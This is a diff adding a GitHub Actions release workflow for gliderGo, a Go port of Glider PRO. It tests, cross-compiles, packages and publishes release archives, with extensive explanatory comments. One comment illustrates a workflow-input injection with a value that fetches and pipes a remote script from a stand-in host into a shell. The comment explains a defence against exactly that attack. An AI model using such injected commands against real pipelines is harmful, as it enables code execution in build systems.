@@ -1,0 +1,484 @@
+# gliderGo release builds.
+#
+# HONEST CAVEAT, READ FIRST. Like ci.yml, this was written on an airgapped host that cannot
+# reach github.com, so it has never run. Every command it invokes is verified locally --
+# `make check`, `make assets-check` and `make cross` all pass here, and the packaging steps
+# below were rehearsed by hand against the same bin/cross/ layout `make cross` writes. What is
+# unverified is the GitHub half: action versions, runner package names, and `gh release`'s
+# behaviour. Expect the first tag to need a correction. Push a throwaway tag first --
+# `git tag v0.0.1-rc1 && git push origin v0.0.1-rc1`, which publishes as a prerelease and can be
+# deleted -- or use the workflow_dispatch entry below, which builds and uploads the archives as a
+# run artifact and cannot create a Release from any ref, including a tag.
+#
+# WHAT A RELEASE ARCHIVE CONTAINS, AND WHY IT IS SHAPED THIS WAY.
+# The binary looks for its assets at the *relative* paths assets/extracted/art,
+# .../houses, .../houseart and .../sound -- see cmd/glidergo/main.go's flag defaults. Nothing
+# resolves a path relative to the executable (os.Executable is not called anywhere), so an
+# archive has to carry its own asset tree and be run from its own root:
+#
+#     tar xzf glidergo-v1.0.0-linux-amd64.tar.gz
+#     cd glidergo-v1.0.0-linux-amd64
+#     ./glidergo
+#
+# Running ./glidergo from anywhere else fails to find its houses. That is docs/IMPROVEMENTS.md
+# 5.3, still open; when it is fixed this comment and the release notes below should shrink.
+#
+# WHICH BUILDS CAN ACTUALLY DRAW. Only linux/amd64, and only because it is the one target built
+# with cgo against libX11. Every other target resolves to the null backend -- see `make cross`'s
+# comment for the exact build-tag complements -- which runs the whole game but shows nothing on
+# screen. Those archives are named `-headless` so that nobody downloads the Windows one
+# expecting to play. A win32 backend is stage 4 and SDL2 is stage 6; see docs/PLAN.md.
+
+name: Release
+
+on:
+  push:
+    tags: ["v*"]
+  workflow_dispatch:
+    inputs:
+      version:
+        description: "Version string to stamp into the binaries (e.g. v0.0.0-test). Not tagged, not released."
+        required: true
+        default: v0.0.0-test
+
+# Read by default; the publish job below opts into `contents: write` for itself alone, so a
+# compromised build step cannot create a release or move a tag.
+permissions:
+  contents: read
+
+# One release per tag, and never two at once: a re-pushed tag would otherwise race two runs
+# uploading the same asset names.
+concurrency:
+  group: release-${{ github.ref }}
+  cancel-in-progress: false
+
+env:
+  # The repo's defaults, restated so a release log shows them. gliderGo is standard library
+  # only -- internal/module asserts it -- so `off` should never bite; if it does, that is the
+  # news, and it is better heard here than in a shipped binary.
+  GOPROXY: "off"
+  GOTOOLCHAIN: local
+
+jobs:
+  # ---------------------------------------------------------------------------
+  # Nothing ships untested.
+  #
+  # This job is not redundant with ci.yml: that workflow triggers on `push: branches` and on
+  # pull_request, and a tag push is neither, so tagging runs no tests at all unless this job
+  # does. Shipping a binary that no suite ever saw is the failure this exists to prevent.
+  # ---------------------------------------------------------------------------
+  verify:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v4
+
+      # libx11-dev is a hard requirement, not a nicety: with cgo on, `vet` and `test` compile
+      # internal/platform/backend, which resolves to the x11 file, and without pkg-config
+      # metadata the build fails with pkg-config's error rather than the Makefile's. xvfb is
+      # for the on-screen bench.
+      - name: Install C dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y --no-install-recommends \
+            build-essential pkg-config libx11-dev xvfb
+
+      - uses: actions/setup-go@v5
+        with:
+          go-version-file: go.mod
+          cache: false
+
+      - name: Report the environment
+        run: make doctor
+
+      # A checkout that silently lost its assets would still pass `make check`: the Makefile's
+      # guards skip the asset-dependent targets and the whole thing goes green. For a release
+      # that is the difference between shipping a game and shipping an empty window. Refuse.
+      - name: Refuse a checkout that is missing its assets
+        run: |
+          test -s assets/extracted/art/manifest.json
+          test -s assets/extracted/sound/manifest.tsv
+          ls assets/extracted/houses/*.house >/dev/null
+
+      - name: make check
+        run: make check OUT="$RUNNER_TEMP"
+
+      # Proves the committed assets are still exactly what the extractor produces from
+      # GliderPRO/ -- so a release ships art nobody hand-edited.
+      - name: Verify the committed assets against their 1994 source
+        run: make assets-check OUT="$RUNNER_TEMP"
+
+      - name: On-screen bench under Xvfb
+        run: xvfb-run -a -s '-screen 0 640x480x24' make bench
+
+  # ---------------------------------------------------------------------------
+  # Build every target, package each with its own copy of the assets, checksum the lot.
+  #
+  # One job rather than a matrix: `make cross` already builds all seven binaries on one Linux
+  # runner in seconds, and a matrix would mean seven upload/download round trips to reassemble
+  # a single SHA256SUMS file. The trade-off is that the darwin and windows archives are
+  # cross-compiled and never executed here -- ci.yml's `native` job is what runs their tests.
+  # ---------------------------------------------------------------------------
+  build:
+    needs: verify
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    # The version this job resolved, so `publish` names the release after the string that is
+    # actually stamped into the binaries and the archive filenames instead of deriving a second
+    # one of its own. On a tag push the two are identical; anywhere else they are not, and the
+    # release would then advertise a filename it did not attach.
+    outputs:
+      version: ${{ steps.v.outputs.version }}
+    steps:
+      # fetch-depth: 0 because the Makefile's VERSION comes from `git describe --tags`. A
+      # shallow checkout has the tag but no history behind it, and describe then answers with
+      # something other than the tag. VERSION is passed explicitly below anyway; the full
+      # history keeps `make doctor` and any incidental describe honest.
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - name: Install C dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y --no-install-recommends \
+            build-essential pkg-config libx11-dev
+
+      - uses: actions/setup-go@v5
+        with:
+          go-version-file: go.mod
+          cache: false
+
+      # The tag for a tag push, the dispatch input for a manual run. Stamped into every binary
+      # via the Makefile's -X main.version, so `glidergo -version` and the title screen agree
+      # with the release it came from. Passed explicitly rather than left to `git describe` so
+      # that a manual run is stamped with something meaningful too.
+      #
+      # The dispatch input arrives through `env:` rather than `${{ }}` inside the script, and
+      # that is not a style choice: `${{ }}` is textual substitution performed before bash sees
+      # a single character of this, so `version='${{ inputs.version }}'` with an input of
+      # `v1'; curl evil.sh | sh; x='` renders as valid shell and runs it -- in the job that
+      # holds the checkout and builds what the release ships. Through `env:` the value is data.
+      #
+      # The allowlist then narrows it to what the rest of the pipeline can actually survive:
+      # `$version` becomes a `-ldflags` argument, six directory names and six archive names, so
+      # a space, a slash or a quote in it breaks the build or produces files nobody can name.
+      # Anchored, because an unanchored `v[0-9]*` admits every one of those.
+      - name: Resolve the version
+        id: v
+        env:
+          INPUT_VERSION: ${{ inputs.version }}
+        run: |
+          set -euo pipefail
+          if [ "$GITHUB_EVENT_NAME" = "workflow_dispatch" ]; then
+            version="$INPUT_VERSION"
+          else
+            version="$GITHUB_REF_NAME"
+          fi
+          if [ -z "$version" ]; then
+            echo "::error::could not resolve a version"
+            exit 1
+          fi
+          if [[ ! "$version" =~ ^v[0-9][A-Za-z0-9.+_-]*$ ]]; then
+            echo "::error::version must look like v1.2.3, got '$version'"
+            exit 1
+          fi
+          echo "version=$version" >> "$GITHUB_OUTPUT"
+          echo "Building $version"
+
+      - name: Refuse a checkout that is missing its assets
+        run: |
+          test -s assets/extracted/art/manifest.json
+          test -s assets/extracted/sound/manifest.tsv
+          ls assets/extracted/houses/*.house >/dev/null
+
+      # Writes bin/cross/glidergo-$os-$arch[.exe] and glidertool-$os-$arch[.exe] for the six
+      # CGO_ENABLED=0 targets, plus bin/cross/glidergo-linux-amd64-x11 for the host's own cgo
+      # build. `make cross` exits non-zero if any of them fails, including the x11 one, so this
+      # step is the gate on "every target a release ships still compiles".
+      - name: Cross-compile every release target
+        env:
+          VERSION: ${{ steps.v.outputs.version }}
+        run: make cross VERSION="$VERSION"
+
+      # Package one directory per target, each self-contained: binaries at the root, the asset
+      # tree at the relative path the binaries look for, and the documents a stranger needs.
+      #
+      # linux/amd64 gets the cgo x11 binary -- the only build that can draw -- so the archive a
+      # Linux player downloads is the playable one. Every other target gets the null-backend
+      # build and is named `-headless`, because an archive that silently shows nothing is worse
+      # than one that says so in its filename.
+      - name: Package the archives
+        id: pkg
+        env:
+          VERSION: ${{ steps.v.outputs.version }}
+        run: |
+          set -euo pipefail
+          mkdir -p dist
+
+          # target|binary-suffix|archive-suffix|format
+          #   binary-suffix picks which bin/cross/ build goes in, since linux-amd64 has two.
+          targets='
+          linux-amd64|-x11||tar
+          linux-arm64||-headless|tar
+          darwin-amd64||-headless|tar
+          darwin-arm64||-headless|tar
+          windows-amd64||-headless|zip
+          windows-arm64||-headless|zip
+          '
+
+          for row in $targets; do
+            IFS='|' read -r target binsuf arcsuf format <<EOF
+          $row
+          EOF
+            name="glidergo-${VERSION}-${target}${arcsuf}"
+            stage="dist/$name"
+            mkdir -p "$stage"
+
+            exe=""
+            case "$target" in windows-*) exe=".exe" ;; esac
+
+            cp "bin/cross/glidergo-${target}${binsuf}${exe}"  "$stage/glidergo${exe}"
+            cp "bin/cross/glidertool-${target}${exe}"         "$stage/glidertool${exe}"
+
+            # The asset tree at exactly the relative path the flag defaults name.
+            mkdir -p "$stage/assets"
+            cp -r assets/extracted "$stage/assets/extracted"
+
+            # The README's nine links into docs/ would every one of them 404 inside an archive
+            # that carries no docs/ -- three of them the screenshots at the very top, which is
+            # the first thing anyone opening it sees. Shipping 9.2 MB of development notes six
+            # times over to fix that is the wrong trade; rewriting the links is the right one.
+            #
+            # Pinned at the commit built from rather than at a branch, so they resolve to the
+            # source these exact binaries were compiled from however far the default branch
+            # moves afterwards. Screenshots first: theirs is the narrower pattern, and they need
+            # /raw/ to render rather than /blob/.
+            base="${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}"
+            sed -E \
+              -e "s#\]\((docs/screenshots/[^)]*)\)#](${base}/raw/${GITHUB_SHA}/\1)#g" \
+              -e "s#\]\((docs/[^)]*)\)#](${base}/blob/${GITHUB_SHA}/\1)#g" \
+              README.md > "$stage/README.md"
+            cp LICENSE CHANGELOG.md "$stage/"
+            mkdir -p "$stage/GliderPRO"
+            cp "GliderPRO/README.md"        "$stage/GliderPRO/README.md"
+            cp "GliderPRO/GPLv2-LICENSE.md" "$stage/GliderPRO/GPLv2-LICENSE.md"
+
+            # How to actually start it, next to the thing you just unpacked. Written for the
+            # only reader who matters here: somebody who has this archive open and does not
+            # know that five of the six cannot draw.
+            #
+            # A headless archive must NOT tell its reader to run the bare binary. The null
+            # backend delivers no quit event, and without -frames the shell loop has no exit
+            # condition, so `./glidergo` prints one line and then spins on an invisible title
+            # screen until Ctrl-C. Both commands below were run against an unpacked archive
+            # and both exit 0 with something to show for it.
+            #
+            # The heredoc bodies sit flush with the block scalar's own indentation -- that is
+            # what puts them at column 0 in the script the runner executes, the same reason the
+            # `read` heredoc above is written that way. Unquoted terminator, so ${cmd} expands.
+            #
+            # ${cmd} carries the `./`, and it is not decoration: an unpacked archive is not on
+            # anybody's PATH, so a bare `glidergo` is "command not found" in every Unix shell,
+            # and a bare `glidergo.exe` is the same in PowerShell -- which is the shell a Windows
+            # reader is most likely to have open. `.\` works in PowerShell and in cmd.exe both.
+            # Assigned in single quotes so the backslash needs no escaping.
+            case "$format" in
+              zip) cmd='.\glidergo.exe' ;;
+              *)   cmd='./glidergo' ;;
+            esac
+
+            if [ -n "$arcsuf" ]; then
+              cat > "$stage/HOW-TO-RUN.txt" <<TXT
+          This build has no window backend yet. It runs the whole game -- physics, rooms,
+          scoring, sound -- but it cannot draw to a screen, so starting it with no arguments
+          leaves you looking at nothing, with no way out but Ctrl-C. That is expected, and it
+          is why this archive is named "headless".
+
+          Two things it will do. Open a terminal in this directory and run:
+
+              ${cmd} -shot title.png
+                  Writes the title screen to title.png, and exits.
+
+              ${cmd} -house Slumberland -frames 300 -dump frames
+                  Plays 300 frames of a house, writes each one into frames/ as a PNG,
+                  and reports the score it reached.
+
+          Either way, run it from this directory: it looks for assets/extracted beside itself.
+
+          A Windows build that draws is stage 4 and macOS is stage 6. See README.md.
+          TXT
+            else
+              cat > "$stage/HOW-TO-RUN.txt" <<TXT
+          Open a terminal in this directory and run:
+
+              ${cmd}
+
+          It must be run from this directory: it looks for assets/extracted alongside itself.
+          TXT
+            fi
+
+            # CRLF for an archive Windows will unpack, so Notepad shows lines and not one line.
+            if [ "$format" = zip ]; then
+              sed -i 's/$/\r/' "$stage/HOW-TO-RUN.txt"
+            fi
+
+            # Every archive is verified to contain the three things that make it playable
+            # before it is sealed. A `cp` that silently did nothing would otherwise ship.
+            test -x "$stage/glidergo${exe}"
+            ls "$stage/assets/extracted/houses/"*.house >/dev/null
+            test -s "$stage/assets/extracted/sound/manifest.tsv"
+
+            # And that the link rewrite above actually fired. A README whose sed silently missed
+            # ships broken images to every downloader, which is exactly the kind of failure
+            # nobody reports.
+            ! grep -q '](docs/' "$stage/README.md"
+
+            case "$format" in
+              tar) tar -C dist -czf "dist/${name}.tar.gz" "$name" ;;
+              zip) (cd dist && zip -qr "${name}.zip" "$name") ;;
+            esac
+            rm -rf "$stage"
+            echo "  packaged $name"
+          done
+
+          # One checksum file for the whole release, with bare filenames so that
+          # `sha256sum -c SHA256SUMS` works in the directory a browser downloaded them into.
+          (cd dist && sha256sum ./*.tar.gz ./*.zip | sed 's| \./| |' > SHA256SUMS)
+          echo "--- dist ---"
+          ls -l dist
+          cat dist/SHA256SUMS
+
+      # Verifies the checksum file against the archives it just described, and proves each
+      # archive actually unpacks. A corrupt upload is not worth discovering from a bug report.
+      - name: Verify the archives and their checksums
+        run: |
+          set -euo pipefail
+          (cd dist && sha256sum -c SHA256SUMS)
+          for f in dist/*.tar.gz; do tar -tzf "$f" >/dev/null; echo "  ok $f"; done
+          for f in dist/*.zip;    do unzip -qt "$f";            echo "  ok $f"; done
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: release-archives
+          path: dist/
+          retention-days: 14
+          if-no-files-found: error
+
+  # ---------------------------------------------------------------------------
+  # Publish. Separate from `build` so that `contents: write` is scoped to the one job that
+  # needs it, and so a manual workflow_dispatch run can build archives without ever being able
+  # to create a release.
+  #
+  # Both halves of the `if` are load-bearing. A tag check alone is not enough: the "Run
+  # workflow" ref picker and the REST dispatch endpoint both accept a tag, so dispatching
+  # against `v1.2.3` makes github.ref `refs/tags/v1.2.3` and a tag-only gate opens. That run
+  # would publish a release named after the tag while every asset in it was named and stamped
+  # with the dispatch input instead -- a release whose own instructions name a file it does not
+  # contain. Requiring the push event is what makes the dispatch path unable to publish at all.
+  # ---------------------------------------------------------------------------
+  publish:
+    needs: build
+    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/download-artifact@v4
+        with:
+          name: release-archives
+          path: dist
+
+      - name: Write the release notes
+        env:
+          VERSION: ${{ needs.build.outputs.version }}
+        run: |
+          set -euo pipefail
+          cat > notes.md <<'HEADER'
+          A Go port of Glider PRO, John Calhoun's 1994 Macintosh game. Each archive is
+          self-contained: the binaries, the original art and sounds, and all 22 houses.
+
+          ### Which one do I want?
+
+          | Archive | Plays on screen? |
+          |---|---|
+          | `linux-amd64` | **Yes** — the only build with a window backend (X11). |
+          | everything marked `headless` | No. It runs the whole game but draws nothing yet. |
+
+          A Windows backend is stage 4 and macOS is stage 6. The headless builds are still
+          useful: they run houses, take `-shot` screenshots and dump frames as PNGs.
+
+          ### Running it
+
+          Unpack, then run it **from the directory you unpacked**, because it looks for
+          `assets/extracted` beside itself:
+
+          ```
+          tar xzf glidergo-VERSION-linux-amd64.tar.gz
+          cd glidergo-VERSION-linux-amd64
+          ./glidergo
+          ```
+
+          Linux needs libX11 at run time (`libx11-6`, present on any desktop install) and a
+          24- or 32-bit display.
+
+          ### Verifying the download
+
+          `SHA256SUMS` covers all six archives, so tell it to ignore the five you did not
+          download — otherwise it reports those as `FAILED open or read` and exits non-zero,
+          which reads exactly like a corrupt download and isn't one:
+
+          ```
+          sha256sum --ignore-missing -c SHA256SUMS
+          ```
+
+          macOS has no `sha256sum`. Hash your one file with `shasum -a 256 <archive>` and
+          compare the line by eye against `SHA256SUMS`.
+
+          ### Licence
+
+          GPLv2, inherited from Calhoun's own source release. The art, sounds and houses are
+          his and his house authors'; see `GliderPRO/README.md` in any archive for the credits.
+          HEADER
+          sed -i "s/VERSION/${VERSION}/g" notes.md
+          echo '--- notes.md ---'; cat notes.md
+
+      # `gh` is preinstalled on GitHub-hosted runners, so this needs no third-party action --
+      # which matters for a project whose whole premise is that it has no dependencies. It also
+      # means there is no marketplace action in the supply chain of a signed release.
+      #
+      # --verify-tag refuses to invent a tag that does not exist. Without it a typo in a
+      # protected-branch setup can create one.
+      #
+      # Attach-if-it-exists rather than create-or-die, because `gh release create` fails on an
+      # existing tag and two ordinary routes arrive here with one already made. Publishing
+      # through the Releases UI creates the tag, which fires this workflow, which then spends
+      # half an hour building archives only to refuse to attach them; and the header above tells
+      # you to rehearse with a throwaway tag, so deleting and re-pushing it hits the same wall.
+      # Either way the archives would survive only as a 14-day run artifact for somebody to
+      # upload by hand. Notes written in the UI are left alone -- a human who typed them meant
+      # them, and this job has nothing better to say.
+      - name: Create or update the release
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          VERSION: ${{ needs.build.outputs.version }}
+        run: |
+          set -euo pipefail
+          if gh release view "$VERSION" >/dev/null 2>&1; then
+            echo "release $VERSION already exists -- attaching the archives, leaving its notes as they are"
+            gh release upload "$VERSION" dist/* --clobber
+          else
+            prerelease=""
+            case "$VERSION" in *-rc*|*-alpha*|*-beta*|*-test*) prerelease="--prerelease" ;; esac
+            gh release create "$VERSION" \
+              --title "gliderGo $VERSION" \
+              --notes-file notes.md \
+              --verify-tag \
+              $prerelease \
+              dist/*
+          fi
+          gh release view "$VERSION" --json tagName,isPrerelease,assets \
+            --jq '"published \(.tagName) prerelease=\(.isPrerelease) assets=\(.assets|length)"'
